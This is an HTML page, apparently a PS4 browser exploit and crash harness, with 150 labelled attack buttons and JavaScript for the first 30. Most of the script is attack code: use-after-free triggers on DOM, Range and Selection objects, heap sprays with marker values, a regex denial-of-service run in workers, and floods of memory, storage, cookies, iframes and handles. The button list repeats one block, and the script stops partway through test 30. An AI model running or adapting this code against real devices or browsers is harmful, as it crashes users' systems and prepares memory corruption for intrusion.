<!DOCTYPE html>
<html>
<head>
<title>PS4 OMEGA SUITE v2</title>
</head>
<body>

<h1>PS4 OMEGA / 1200.ELF ANALYZER</h1>
<hr>

<h3>USERLAND VECTORS</h3>
<button onclick="runTest01()">01. DOM TREE UAF</button>
<button onclick="runTest02()">02. TEXTDECODER OVF</button>
<button onclick="runTest03()">03. PROXY RECURSION</button>
<button onclick="runTest04()">04. SVG TYPE CONF</button>
<button onclick="runTest05()">05. ARRAY SORT SIDE</button>
<button onclick="runTest06()">06. HEAP SPRAY</button>
<button onclick="runTest07()">07. IPC STORM</button>
<button onclick="runTest08()">08. REGEX DOS</button>
<button onclick="runTest09()">09. BLOB FLOOD</button>
<button onclick="runTest10()">10. GPU TEXTURE OOM</button>
<button onclick="runTest11()">11. XHR SYNC RACE</button>
<button onclick="runTest12()">12. JSON DEEP PARSE</button>
<button onclick="runTest13()">13. INTL LOCALE CRASH</button>
<button onclick="runTest14()">14. RANGE DETACH UAF</button>
<button onclick="runTest15()">15. EVENT DISPATCH FLOOD</button>
<button onclick="runTest16()">16. FILEREADER LEAK</button>
<button onclick="runTest17()">17. BUFFER ALIASING</button>
<button onclick="runTest18()">18. HISTORY STATE OOM</button>
<button onclick="runTest19()">19. STORAGE QUOTA DOS</button>
<button onclick="runTest20()">20. IFRAME CHURN PANIC</button>
<button onclick="runTest21()">21. SELECTION API UAF</button>
<button onclick="runTest22()">22. MAP ITERATOR INVALIDATION</button>
<button onclick="runTest23()">23. ROPE STRING FLATTEN</button>
<button onclick="runTest24()">24. AUDIO TRACK LIST RACE</button>
<button onclick="runTest25()">25. HTMLCOLLECTION NAMED ITEM</button>
<button onclick="runTest26()">26. TIMER HEAP FLOOD</button>
<button onclick="runTest27()">27. CANVAS PATH VERTEX OOM</button>
<button onclick="runTest28()">28. COOKIE BUFFER OVERFLOW</button>
<button onclick="runTest29()">29. ATTRIBUTE NODE EXHAUSTION</button>
<button onclick="runTest30()">30. NULL IMG SRC SOCKET LEAK</button>
<button onclick="runTest31()">31. XSLT TRANSFORM RECURSION</button>
<button onclick="runTest32()">32. MUTATION OBSERVER LOOP</button>
<button onclick="runTest33()">33. CROSS-DOC NODE ADOPTION</button>
<button onclick="runTest34()">34. CSS CALC DEPTH CRASH</button>
<button onclick="runTest35()">35. REGEX CACHE POISONING</button>
<button onclick="runTest36()">36. PROTOTYPE CHAIN BOMB</button>
<button onclick="runTest37()">37. HUGE STRING JOIN OOM</button>
<button onclick="runTest38()">38. UNALIGNED DATAVIEW STRESS</button>
<button onclick="runTest39()">39. EVENT LISTENER EXHAUSTION</button>
<button onclick="runTest40()">40. NULL OBJECT PROPERTY SPRAY</button>
<button onclick="runTest41()">41. FONTFACE SET ITERATOR UAF</button>
<button onclick="runTest42()">42. WORKER TRANSFERABLE RACE</button>
<button onclick="runTest43()">43. NODEITERATOR DETACH</button>
<button onclick="runTest44()">44. ARRAY SPLICE PROXY TRAP</button>
<button onclick="runTest45()">45. TEXTTRACK CUE INVALIDATION</button>
<button onclick="runTest46()">46. SYNC XHR THREAD LOCK</button>
<button onclick="runTest47()">47. HISTORY STATE FLOOD</button>
<button onclick="runTest48()">48. STORAGE I/O THRASHING</button>
<button onclick="runTest49()">49. RECURSIVE IFRAME STACK</button>
<button onclick="runTest50()">50. URL OBJECT HANDLE LEAK</button>
<button onclick="runTest51()">51. DOCUMENT WRITE RE-ENTRANCY</button>
<button onclick="runTest52()">52. DOM ADOPT NODE GETTER POISON</button>
<button onclick="runTest53()">53. REGEX REPLACE STRING MUTATION</button>
<button onclick="runTest54()">54. PROTOTYPE HIJACK SPRAY</button>
<button onclick="runTest55()">55. CSS RULE INSERT RACE</button>
<button onclick="runTest56()">56. XHR FILE DESCRIPTOR LEAK</button>
<button onclick="runTest57()">57. RECURSIVE BLOB EXPANSION</button>
<button onclick="runTest58()">58. WINDOW NAME HUGE ALLOC</button>
<button onclick="runTest59()">59. HEAP PRIMING FRAGMENTATION</button>
<button onclick="runTest60()">60. IFRAME SRCDOC THREAD BOMB</button>
<button onclick="runTest61()">61. DATAVIEW DETACH RACE</button>
<button onclick="runTest62()">62. PROMISE REJECTION FLOOD</button>
<button onclick="runTest63()">63. OBJECT DEFINE PROPERTY LOOP</button>
<button onclick="runTest64()">64. CANVAS PATTERN RECURSION</button>
<button onclick="runTest65()">65. FILTER FUNCTION CONTEXT SWAP</button>
<button onclick="runTest66()">66. HUGE ARRAYBUFFER MAP FAIL</button>
<button onclick="runTest67()">67. IFRAME RELOAD STORM</button>
<button onclick="runTest68()">68. NOTIFICATION API DOS</button>
<button onclick="runTest69()">69. GPU SHADER COMPILER HANG</button>
<button onclick="runTest70()">70. WEBSQL TRANSACTION LOCK</button>
<button onclick="runTest71()">71. ARRAY CONSTRUCTOR POISON</button>
<button onclick="runTest72()">72. FUNCTION BIND RECURSION</button>
<button onclick="runTest73()">73. JSON CYCLIC STRINGIFY</button>
<button onclick="runTest74()">74. ACCESSOR PROPERTY STACK</button>
<button onclick="runTest75()">75. WEBKIT URL PARSER OVERFLOW</button>
<button onclick="runTest76()">76. CANVAS PIXEL MANIPULATION</button>
<button onclick="runTest77()">77. TEXT ENCODER MEMORY SPIKE</button>
<button onclick="runTest78()">78. DOM ELEMENT DEEP CLONE</button>
<button onclick="runTest79()">79. HUGE SCROLL EVENT FLOOD</button>
<button onclick="runTest80()">80. IFRAME SANDBOX VIOLATION</button>
<button onclick="runTest81()">81. DOM TOKEN LIST TOGGLE RACE</button>
<button onclick="runTest82()">82. WEAKMAP GC THRASHING</button>
<button onclick="runTest83()">83. TEXT NODE SPLIT NORMALIZE</button>
<button onclick="runTest84()">84. PROPERTY HASH COLLISION</button>
<button onclick="runTest85()">85. FORM DATA MULTIPART FLOOD</button>
<button onclick="runTest86()">86. WORKER THREAD BOMB</button>
<button onclick="runTest87()">87. SYNC FILE READ LOCK</button>
<button onclick="runTest88()">88. TABLE LAYOUT RECALC OOM</button>
<button onclick="runTest89()">89. MATH POW WATCHDOG KILL</button>
<button onclick="runTest90()">90. HUGE URL SEARCH PARAMS</button>
<button onclick="runTest91()">91. TREEWALKER FILTER UAF</button>
<button onclick="runTest92()">92. ARRAY CONCAT SPREAD POISON</button>
<button onclick="runTest93()">93. REGEX LASTINDEX OVERFLOW</button>
<button onclick="runTest94()">94. TEXTAREA LAYOUT THRASHING</button>
<button onclick="runTest95()">95. FONTFACE RECURSIVE LOAD</button>
<button onclick="runTest96()">96. LOCAL PORT MBUF EXHAUSTION</button>
<button onclick="runTest97()">97. BLOB URL REVOCATION RACE</button>
<button onclick="runTest98()">98. IFRAME NESTING DEPTH KILL</button>
<button onclick="runTest99()">99. CANVAS GRADIENT MEM LEAK</button>
<button onclick="runTest100()">100. THE OMEGA COMBO (ALL-IN)</button>
<button onclick="runTest101()">101. ATTRIBUTE NODE SETNAMEDITEM RACE</button>
<button onclick="runTest102()">102. EVENT LISTENER REMOVE-ADD LOOP</button>
<button onclick="runTest103()">103. CANVAS GETCONTEXT TYPE FLIP</button>
<button onclick="runTest104()">104. XMLSERIALIZER RECURSIVE BOMB</button>
<button onclick="runTest105()">105. OBJECT GETOWNPROPERTYDESCRIPTOR STRESS</button>
<button onclick="runTest106()">106. IFRAME SRC BLOB RECURSION</button>
<button onclick="runTest107()">107. XHR ABORT RACE CONDITION</button>
<button onclick="runTest108()">108. FILE READER SYNC FREEZE</button>
<button onclick="runTest109()">109. HUGE MATH RANDOM BUFFER</button>
<button onclick="runTest110()">110. DOM IMPLEMENTATION CREATE DOC FLOOD</button>
<button onclick="runTest111()">111. ARRAY BUFFER NEUTERING RACE</button>
<button onclick="runTest112()">112. PROTOTYPE POLLUTION CHAIN</button>
<button onclick="runTest113()">113. EVENT DISPATCH RECURSIVE TRAP</button>
<button onclick="runTest114()">114. DOM STRING MAP PROPERTY FLOOD</button>
<button onclick="runTest115()">115. SELECTION EXTEND CRASH</button>
<button onclick="runTest116()">116. CANVAS 2D PATH EXPLOSION</button>
<button onclick="runTest117()">117. XHR SYNC BLOB LEAK</button>
<button onclick="runTest118()">118. LOCALSTORAGE QUOTA THRASHER</button>
<button onclick="runTest119()">119. NESTED WORKER BOMBER</button>
<button onclick="runTest120()">120. IFRAME HISTORY STATE DOS</button>
<button onclick="runTest121()">121. MESSAGE PORT TRANSFER RACE</button>
<button onclick="runTest122()">122. DOM PARSER RECURSIVE ENTITY</button>
<button onclick="runTest123()">123. FORM VALIDATION BUBBLE TRAP</button>
<button onclick="runTest124()">124. SELECTION RANGE COLLAPSE LOOP</button>
<button onclick="runTest125()">125. TEXT NODE DATA REPLACE OVERFLOW</button>
<button onclick="runTest126()">126. SETTIMEOUT HEAP FLOOD</button>
<button onclick="runTest127()">127. XHR RESPONSE TEXT OOM</button>
<button onclick="runTest128()">128. CANVAS PUTIMAGEDATA ALIGN FAIL</button>
<button onclick="runTest129()">129. BLOB SLICE RECURSION DEPTH</button>
<button onclick="runTest130()">130. IFRAME RELOAD MEMORY LEAK</button>
<button onclick="runTest131()">131. HISTORY STATE CYCLIC BOMB</button>
<button onclick="runTest132()">132. MESSAGE CHANNEL PORT CLONE LOOP</button>
<button onclick="runTest133()">133. NODE FILTER RE-ENTRANCY TRAP</button>
<button onclick="runTest134()">134. DOM IMPLEMENTATION PROTOTYPE SPRAY</button>
<button onclick="runTest135()">135. TEXT ENCODER STREAM FRAGMENTATION</button>
<button onclick="runTest136()">136. FETCH API KEEP-ALIVE FLOOD</button>
<button onclick="runTest137()">137. BLOB SLICE MEMORY MAPPING FAIL</button>
<button onclick="runTest138()">138. SYNC XHR RECURSIVE OPEN</button>
<button onclick="runTest139()">139. WORKER IMPORT SCRIPTS DOS</button>
<button onclick="runTest140()">140. IFRAME SRC JAVASCRIPT URI LOOP</button>
<button onclick="runTest141()">141. CUSTOM ELEMENT UPGRADE RACE</button>
<button onclick="runTest142()">142. READABLE STREAM TEARING</button>
<button onclick="runTest143()">143. SHADOW DOM EVENT RETARGETING</button>
<button onclick="runTest144()">144. PROXY REVOKE DURING ITERATION</button>
<button onclick="runTest145()">145. HTML OPTION COLLECTION SETTER</button>
<button onclick="runTest146()">146. FILE READER SYNC BLOB FLOOD</button>
<button onclick="runTest147()">147. HUGE HEADER XHR ATTACK</button>
<button onclick="runTest148()">148. RECURSIVE BLOB CONSTRUCTION</button>
<button onclick="runTest149()">149. LOOPBACK SOCKET CONNECT STORM</button>
<button onclick="runTest150()">150. DOM STORAGE TRANSACTION LOCK</button>
<button onclick="runTest141()">141. CUSTOM ELEMENT UPGRADE RACE</button>
<button onclick="runTest142()">142. READABLE STREAM TEARING</button>
<button onclick="runTest143()">143. SHADOW DOM EVENT RETARGETING</button>
<button onclick="runTest144()">144. PROXY REVOKE DURING ITERATION</button>
<button onclick="runTest145()">145. HTML OPTION COLLECTION SETTER</button>
<button onclick="runTest146()">146. FILE READER SYNC BLOB FLOOD</button>
<button onclick="runTest147()">147. HUGE HEADER XHR ATTACK</button>
<button onclick="runTest148()">148. RECURSIVE BLOB CONSTRUCTION</button>
<button onclick="runTest149()">149. LOOPBACK SOCKET CONNECT STORM</button>
<button onclick="runTest150()">150. DOM STORAGE TRANSACTION LOCK</button>

<hr>
<h3>SYSTEM LOG</h3>
<div id="logger" style="border:1px solid #000; width:95%; height:300px; overflow:scroll; font-family:monospace;">
    [READY] Sistema aguardando injeção de vetores...
</div>

<script>
function log(msg) {
    var l = document.getElementById('logger');
    var d = new Date();
    var time = d.getHours() + ":" + d.getMinutes() + ":" + d.getSeconds() + "." + d.getMilliseconds();
    l.innerHTML = "[" + time + "] " + msg + "<br>" + l.innerHTML;
}

function runTest01() {
    log("Iniciando Teste 01 (DOM UAF)...");
    var root = document.createElement('div');
    var nodes = [];
    var trash = [];
    document.body.appendChild(root);
    for(var i=0; i<400; i++) {
        var el = document.createElement('div');
        el.id = 'n' + i;
        var s = document.createElement('span');
        s.textContent = "A".repeat(255); 
        el.appendChild(s);
        root.appendChild(el);
        nodes.push(el);
    }
    function walker() {
        var range = document.createRange();
        range.selectNodeContents(root);
        range.deleteContents(); 
        for(var j=0; j<150; j++) {
            if(nodes[j]) {
                trash.push(nodes[j]);
                nodes[j] = null;
                try { 
                    var x = trash[trash.length-1].firstChild.textContent;
                    var y = trash[trash.length-1].nextSibling;
                } catch(e){}
            }
        }
    }
    root.addEventListener('DOMNodeRemoved', function() {
        walker();
        var heavy = new Uint32Array(0x2000).fill(0x41414141);
        var spray = [];
        for(let k=0; k<100; k++) spray.push(new ArrayBuffer(64));
    });
    document.body.removeChild(root);
    log(">> T01 Concluído: Vetor DOM executado. Verifique estabilidade.");
}

function runTest02() {
    log("Iniciando Teste 02 (TextDecoder)...");
    var decoder = new TextDecoder('utf-8', {fatal: false});
    var spray = [];
    var buffer = new Uint8Array(1024 * 1024 * 4); 
    for(var i=0; i<buffer.length; i++) buffer[i] = (i % 2 === 0) ? 0xC0 : 0x80;
    
    try {
        for(var k=0; k<100; k++) {
            var chunk = buffer.subarray(k * 2000, (k+1) * 2000);
            var str = decoder.decode(chunk, {stream: true});
            spray.push(str + "X".repeat(0xFF)); 
            if(k % 20 === 0) { spray = []; }
        }
        var massive = decoder.decode(buffer); 
        log(">> T02 Sucesso: Decoded Len: " + massive.length);
    } catch(e) {
        log(">> T02 Falha: " + e.message);
    }
}

function runTest03() {
    log("Iniciando Teste 03 (Proxy Recursion)...");
    var target = {};
    var p = new Proxy(target, {
        get: function(obj, prop) {
            if (prop === 'xyz') return 1;
            var junk = {a: 1, b: "B".repeat(128), c: new Uint8Array(32)};
            return obj[prop] + p[prop]; 
        }
    });
    try {
        Object.prototype.temp = p;
        var r = p.anyProp; 
    } catch(e) {
        var arr = [];
        for(var i=0; i<20000; i++) arr.push({x: p, y: new Uint32Array(16)});
        log(">> T03 Concluído: Stack Depth Limit Atingido.");
    }
}

function runTest04() {
    log("Iniciando Teste 04 (SVG Type Conf)...");
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var path = document.createElementNS("http://www.w3.org/2000/svg", "path");
    svg.appendChild(path);
    document.body.appendChild(svg);
    var list = [];
    for(var i=0; i<0x400; i++) {
        var o = { 
            toString: function() { 
                path.parentNode.removeChild(path); 
                var fill = new Array(100).fill(1.1);
                return "M10 10"; 
            } 
        };
        list.push(o);
    }
    try {
        path.setAttribute("d", list[100]);
        var point = svg.createSVGPoint();
        point.matrixTransform(svg.getScreenCTM());
    } catch(e) {}
    log(">> T04 Concluído: SVG Casting forçado.");
}

function runTest05() {
    log("Iniciando Teste 05 (Array Sort)...");
    var arr = new Array(4000);
    for(var i=0; i<arr.length; i++) arr[i] = i;
    arr[0] = 1.1;
    arr.sort(function(a, b) {
        if (a === 200) {
            arr.length = 1; 
            var spray = [];
            for(var k=0; k<10000; k++) spray.push(new Uint32Array(64).fill(0x13371337));
            return 0;
        }
        return a - b;
    });
    log(">> T05 Concluído: Array length pós-sort: " + arr.length);
}

function runTest06() {
    log("Iniciando Teste 06 (Kernel Heap Spray)...");
    var ab = new ArrayBuffer(0x20000); 
    var u32 = new Uint32Array(ab);
    var targetArrays = [];
    for(var i=0; i<8000; i++) {
        var size = (i % 4 === 0) ? 0x200 : 0x8000; 
        targetArrays.push(new Uint8Array(size));
        targetArrays[i].fill(0x41);
    }
    for(var i=0; i<targetArrays.length; i+=2) {
        targetArrays[i] = null;
    }
    var fillers = [];
    for(var j=0; j<4000; j++) {
        var f = new Float64Array(32); 
        f[0] = 1.61803398875e-300; 
        fillers.push(f);
    }
    log(">> T06 Concluído: Memória fragmentada e preenchida.");
}

function runTest07() {
    log("Iniciando Teste 07 (IPC Storm)...");
    var ports = [];
    var channelCount = 0;
    function sprayIPC() {
        try {
            for(var i=0; i<1000; i++) {
                var mc = new MessageChannel();
                ports.push(mc.port1);
                mc.port2.postMessage("ping", [mc.port2]); 
                channelCount++;
            }
            if(channelCount < 25000) {
                setTimeout(sprayIPC, 5);
            } else {
                for(var p of ports) p.close();
                log(">> T07 Concluído: Handles esgotados e fechados.");
            }
        } catch(e) { log(">> T07 Erro: " + e); }
    }
    sprayIPC();
}

function runTest08() {
    log("Iniciando Teste 08 (Regex DoS)...");
    var pattern = "((a*)+)+b"; 
    var str = "a".repeat(5000); 
    var blob = new Blob(["onmessage=function(e){ var r = new RegExp('((a*)+)+b'); r.exec(e.data); }"], {type: "application/javascript"});
    for(var i=0; i<12; i++) { 
        var w = new Worker(URL.createObjectURL(blob));
        w.postMessage(str);
    }
    log(">> T08 Enviado: 12 Workers lançados (Possível Freeze).");
}

function runTest09() {
    log("Iniciando Teste 09 (Blob Flood)...");
    var urls = [];
    var data = new Uint8Array(1024*1024*2).fill(0x90); 
    var loop = setInterval(function() {
        for(var i=0; i<100; i++) {
            var b = new Blob([data], {type: "application/octet-stream"});
            var u = URL.createObjectURL(b);
            urls.push(u);
            if(urls.length > 3000) {
                URL.revokeObjectURL(urls.shift());
                var junk = new Array(2000).join('x');
            }
        }
        if(urls.length % 1000 == 0) log(".. URLs ativas: " + urls.length);
        
        if(urls.length > 50000) {
            clearInterval(loop);
            log(">> T09 Concluído: Flood finalizado.");
        }
    }, 20);
}

function runTest10() {
    log("Iniciando Teste 10 (GPU OOM)...");
    var canvases = [];
    try {
        for(var i=0; i<1000; i++) {
            var c = document.createElement('canvas');
            c.width = 4096 - (i % 100); 
            c.height = 2048 + (i % 100);
            var ctx = c.getContext('2d');
            if(ctx) {
                var imgData = ctx.createImageData(200, 200);
                for(var j=0; j<imgData.data.length; j+=4) imgData.data[j] = 255;
                ctx.putImageData(imgData, 0, 0);
                canvases.push(c);
            }
        }
    } catch(e) {
        canvases = null;
        log(">> T10 Critical: GPU OOM Triggered.");
    }
    if(canvases) log(">> T10 Info: Alocados " + canvases.length + " canvases.");
}
function runTest11() {
    log("Iniciando T11: XHR Sync Race...");
    var pool = [];
    var running = true;
    try {
        for(var i=0; i<50; i++) {
            var x = new XMLHttpRequest();
            pool.push(x);
            x.onreadystatechange = function() {
                if(this.readyState == 4 && running) {
                    var s = document.createElement('script');
                    s.textContent = 'var ' + 'v'.repeat(100) + ' = ' + Date.now();
                    document.body.appendChild(s);
                    document.body.removeChild(s);
                    this.open("GET", window.location.href, false);
                    try { this.send(); } catch(e){}
                }
            };
        }
        pool.forEach(function(xhr) {
            xhr.open("GET", "/", true);
            xhr.send();
        });
        setTimeout(function(){ running = false; log(">> T11: XHR Loop Parado"); }, 3000);
    } catch(e) { log(">> T11 Erro: " + e.message); }
}

function runTest12() {
    log("Iniciando T12: JSON Deep Nesting...");
    var depth = 8000;
    var jsonStr = '{"a":';
    for(var i=0; i<depth; i++) jsonStr += '{"b":';
    jsonStr += '1';
    for(var i=0; i<depth; i++) jsonStr += '}';
    jsonStr += '}';
    try {
        var t0 = performance.now();
        var obj = JSON.parse(jsonStr);
        var spray = new Array(1000).fill(obj);
        log(">> T12: Parse OK (" + (performance.now()-t0).toFixed(2) + "ms). Objects created.");
    } catch(e) {
        var junk = new Uint32Array(0x10000);
        junk.fill(0xDEADBEEF);
        log(">> T12 Exception (Stack Overflow?): " + e.message);
    }
}

function runTest13() {
    log("Iniciando T13: Intl Locale Stress...");
    var locales = ['en-US', 'ar-SA', 'zh-CN', 'ja-JP', 'ru-RU', 'th-TH'];
    var storage = [];
    try {
        for(var i=0; i<2000; i++) {
            var loc = locales[i % locales.length];
            var opt = { 
                style: 'currency', 
                currency: 'USD', 
                currencyDisplay: i % 2 == 0 ? 'symbol' : 'name',
                maximumSignificantDigits: 20
            };
            var nf = new Intl.NumberFormat(loc, opt);
            var res = nf.format(123456.789);
            if(i % 50 === 0) {
                storage.push({formatter: nf, result: res + "A".repeat(255)});
            }
        }
        log(">> T13: Intl Objects: " + storage.length);
    } catch(e) { log(">> T13 Erro: " + e); }
}

function runTest14() {
    log("Iniciando T14: Range Detach UAF...");
    var p = document.createElement('p');
    p.innerHTML = "<b>bold</b><span>text</span><i>italic</i>";
    document.body.appendChild(p);
    var r = document.createRange();
    r.setStart(p.firstChild, 0);
    r.setEnd(p.lastChild, 1);
    var iterations = 0;
    
    var i = setInterval(function() {
        iterations++;
        r.deleteContents();
        p.innerHTML = "<b>R" + iterations + "</b>";
        r.setStart(p.firstChild, 0);
        var f = document.createDocumentFragment();
        f.appendChild(document.createElement('div'));
        r.insertNode(f);
        
        if(iterations > 500) {
            clearInterval(i);
            document.body.removeChild(p);
            log(">> T14: Range manipulation concluída.");
        }
    }, 5);
}

function runTest15() {
    log("Iniciando T15: Event Dispatch Flood...");
    var target = document.createElement('div');
    var count = 0;
    var handler = function(e) {
        count++;
        if(count % 100 === 0) {
            var heavy = new Uint8Array(0x1000).fill(count);
        }
        if(count < 5000) {
            target.dispatchEvent(new Event('customevent'));
        }
    };
    target.addEventListener('customevent', handler);
    try {
        target.dispatchEvent(new Event('customevent'));
        log(">> T15: Events dispatched: " + count);
    } catch(e) {
        log(">> T15 Stack Limit: " + e.message);
    }
}

function runTest16() {
    log("Iniciando T16: FileReader Resource Leak...");
    var readers = [];
    var blobData = new Uint8Array(1024*50).fill(65);
    var blob = new Blob([blobData]);
    
    var interval = setInterval(function() {
        for(var i=0; i<20; i++) {
            var fr = new FileReader();
            fr.readAsDataURL(blob);
            readers.push(fr);
        }
        if(readers.length > 2000) {
            // Não limpamos o array intencionalmente para segurar handles
            log(">> T16: Active Readers: " + readers.length + " (Leaking handles)");
            if(readers.length > 8000) clearInterval(interval);
        }
    }, 50);
}

function runTest17() {
    log("Iniciando T17: Buffer Aliasing...");
    var ab = new ArrayBuffer(0x100000); 
    var view1 = new Uint8Array(ab);
    var view2 = new Float64Array(ab);
    var view3 = new DataView(ab);
    
    try {
        for(var i=0; i<view2.length; i++) {
            view2[i] = 1.23456789e+100; 
            if(i % 1000 === 0) {
                var check = view3.getUint8(i*8);
                view1[i*8] = check ^ 0xFF; 
            }
        }
        var complex = [];
        for(var k=0; k<1000; k++) complex.push(ab.slice(k*100, (k+1)*100));
        log(">> T17: Buffer manipulado via múltiplas views.");
    } catch(e) { log(">> T17 Erro: " + e); }
}

function runTest18() {
    log("Iniciando T18: History State OOM...");
    var stateObj = { data: "X".repeat(1024*10) }; 
    var count = 0;
    var t = setInterval(function() {
        try {
            history.pushState(stateObj, "Page " + count, "?p=" + count);
            count++;
            if(count % 500 === 0) log(".. History length: " + history.length);
        } catch(e) {
            clearInterval(t);
            log(">> T18 Erro/Limite: " + e.message);
        }
        if(count > 10000) clearInterval(t);
    }, 1);
}

function runTest19() {
    log("Iniciando T19: Storage Quota DoS...");
    localStorage.clear();
    var chunk = "A".repeat(1024 * 100); 
    var keys = [];
    try {
        for(var i=0; i<1000; i++) {
            var key = "k" + i;
            localStorage.setItem(key, chunk);
            keys.push(key);
        }
    } catch(e) {
        log(">> T19 Quota Atingida: " + e.message);
        try {
            var huge = new Array(keys.length).fill(chunk);
            localStorage.setItem("killer", huge.join('')); 
        } catch(z) {}
    }
    log(">> T19: Itens gravados: " + keys.length);
}

function runTest20() {
    log("Iniciando T20: Iframe Churn Panic...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var frames = 0;
    
    var loop = setInterval(function() {
        for(var i=0; i<10; i++) {
            var ifr = document.createElement('iframe');
            container.appendChild(ifr);
            try {
                var d = ifr.contentDocument;
                d.open();
                d.write("<html><body>" + "<div></div>".repeat(100) + "</body></html>");
                d.close();
            } catch(e){}
            
            if(frames % 3 === 0) {
                container.removeChild(container.firstChild);
            }
            frames++;
        }
        if(frames % 200 === 0) log(".. Frames processados: " + frames);
        
        if(frames > 3000) {
            clearInterval(loop);
            log(">> T20: Churn finalizado.");
        }
    }, 50);
}
function runTest21() {
    log("Iniciando T21: Selection API Use-After-Free...");
    var sel = window.getSelection();
    var range = document.createRange();
    var div = document.createElement('div');
    div.innerHTML = "<span>A</span><span>B</span><span>C</span>";
    document.body.appendChild(div);
    range.selectNode(div.firstChild);
    sel.addRange(range);
    
    try {
        for(var i=0; i<100; i++) {
            var f = document.createDocumentFragment();
            f.appendChild(document.createElement('b'));
            range.insertNode(f);
            sel.extend(div.lastChild, 0);
            
            if(i % 10 === 0) {
                div.innerHTML = ""; 
                var junk = new Uint32Array(1024).fill(0x13371337);
            }
            sel.removeAllRanges();
            sel.addRange(range);
        }
    } catch(e) {
        log(">> T21 Exception: " + e.message);
    }
    document.body.removeChild(div);
    log(">> T21 Finalizado: Selection/Range Stress.");
}

function runTest22() {
    log("Iniciando T22: Map Iterator Invalidation...");
    var m = new Map();
    for(var i=0; i<1000; i++) m.set(i, {id: i, buffer: new Uint8Array(64)});
    var iter = m.entries();
    var steps = 0;
    
    try {
        var item;
        while(!(item = iter.next()).done) {
            steps++;
            if(steps % 50 === 0) {
                for(var j=0; j<100; j++) m.delete(steps + j);
                for(var k=0; k<200; k++) m.set("n"+k, new ArrayBuffer(128));
                
                var spray = []; 
                for(var x=0; x<50; x++) spray.push({a:1, b:item.value});
            }
            if(steps > 5000) break;
        }
        log(">> T22 Iterator: Steps processed " + steps);
    } catch(e) {
        log(">> T22 Crash Logic: " + e.message);
    }
}

function runTest23() {
    log("Iniciando T23: Rope String Flattening...");
    var s = "Root";
    var rope = [];
    var parts = ["A", "B", "C", "D"];
    
    try {
        for(var i=0; i<20000; i++) {
            s += parts[i % 4] + i; 
        }
        rope.push(s);
        
        var s2 = s.substring(100, 20000); 
        var s3 = s2.toUpperCase(); 
        
        var trigger = s3.indexOf("C100"); 
        
        if(trigger > -1) {
            var atom = s.substring(0, 10); 
            var memory = new Uint8Array(1024*1024*5); 
            log(">> T23 Rope: String flattened & searched. Len: " + s.length);
        }
    } catch(e) { log(">> T23 Erro: " + e); }
}

function runTest24() {
    log("Iniciando T24: AudioTrackList Race...");
    var v = document.createElement('video');
    var store = [];
    
    var t = setInterval(function() {
        if(v.audioTracks) { 
            log(">> T24: AudioTracks API presente.");
            // Lógica específica se a API existir
        } else {
            // Fallback para elementos de áudio padrão
            for(var i=0; i<50; i++) {
                var a = new Audio();
                a.src = "dummy" + i + ".mp3";
                store.push(a);
                a.onloadedmetadata = function() {
                    this.src = ""; 
                    store.shift(); 
                };
            }
        }
        
        if(store.length > 500) {
            store = []; 
            var heavy = new Float64Array(10000).fill(1.23);
        }
        
        if(store.length > 2000) clearInterval(t);
    }, 50);
    setTimeout(function(){ clearInterval(t); log(">> T24 Concluído (Race Attempt)."); }, 2000);
}

function runTest25() {
    log("Iniciando T25: HTMLCollection NamedItem...");
    var form = document.createElement('form');
    document.body.appendChild(form);
    var names = ["id", "name", "toString", "length", "item", "namedItem"];
    
    try {
        for(var i=0; i<1000; i++) {
            var input = document.createElement('input');
            input.setAttribute('name', names[i % names.length]);
            input.setAttribute('id', 'val' + i);
            form.appendChild(input);
        }
        
        var collision = form.elements['toString']; 
        var len = form.elements['length']; 
        
        form.innerHTML = ""; 
        var spray = new Array(500).fill(1.1);
        
        log(">> T25: Element lookup stress performed.");
    } catch(e) { log(">> T25 Erro: " + e); }
    document.body.removeChild(form);
}

function runTest26() {
    log("Iniciando T26: Timer Heap Flood...");
    var timers = [];
    var count = 0;
    
    function recursiveTimer() {
        count++;
        var t = setTimeout(function() {
            var x = new Uint8Array(1024); 
            if(count % 2 === 0) recursiveTimer();
        }, 10 + (count % 50));
        timers.push(t);
        
        if(timers.length > 5000) {
            timers.splice(0, 1000).forEach(clearTimeout); 
        }
    }
    
    for(var i=0; i<100; i++) recursiveTimer();
    
    setTimeout(function() {
        timers.forEach(clearTimeout);
        log(">> T26: Timers active max: " + count);
    }, 3000);
}

function runTest27() {
    log("Iniciando T27: Canvas Path Vertex OOM...");
    var c = document.createElement('canvas');
    c.width = 2048; c.height = 2048;
    var ctx = c.getContext('2d');
    
    if(ctx) {
        ctx.beginPath();
        try {
            for(var i=0; i<50000; i++) {
                ctx.moveTo(Math.random()*2000, Math.random()*2000);
                ctx.lineTo(Math.random()*2000, Math.random()*2000);
                ctx.bezierCurveTo(i, i, i+10, i+10, 500, 500);
                
                if(i % 10000 === 0) {
                    var data = ctx.getImageData(0,0,10,10); 
                    log(".. Path vertices: " + i);
                }
            }
            ctx.fill(); 
        } catch(e) {
            log(">> T27 GPU Panic: " + e.message);
        }
    }
    log(">> T27: Complex path render sent.");
}

function runTest28() {
    log("Iniciando T28: Cookie Buffer Overflow...");
    var base = "val=" + "B".repeat(4000) + "; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT;";
    var count = 0;
    
    try {
        var t = setInterval(function() {
            document.cookie = "id" + count + "=" + base;
            count++;
            
            if(count % 50 === 0) {
                var c = document.cookie; 
                if(c.length > 50000) {
                    var all = document.cookie.split(';');
                    for(var i=0; i<all.length; i++) {
                        document.cookie = all[i] + "; expires=Thu, 01 Jan 1970 00:00:00 GMT";
                    }
                }
            }
            if(count > 500) {
                clearInterval(t);
                log(">> T28: Cookie flood stop. Total ops: " + count);
            }
        }, 5);
    } catch(e) { log(">> T28 Erro: " + e); }
}

function runTest29() {
    log("Iniciando T29: Attribute Node Exhaustion...");
    var el = document.createElement('div');
    var attrs = [];
    
    try {
        for(var i=0; i<15000; i++) {
            var name = "data-val-" + i;
            var val = "x".repeat(50); 
            el.setAttribute(name, val);
            attrs.push(name);
        }
        
        var clone = el.cloneNode(true); 
        document.body.appendChild(clone);
        
        var junk = clone.outerHTML.length; 
        document.body.removeChild(clone);
        log(">> T29: Attributes set: " + attrs.length);
        
    } catch(e) {
        log(">> T29 Resource Limit: " + e.message);
    }
}

function runTest30() {
    log("Iniciando T30: Socket Leak (Img Src)...");
    var imgs = [];
    var portStart = 30000;
    
    var loop = setInterval(function() {
        for(var i=0; i<20; i++) {
            var img = new Image();
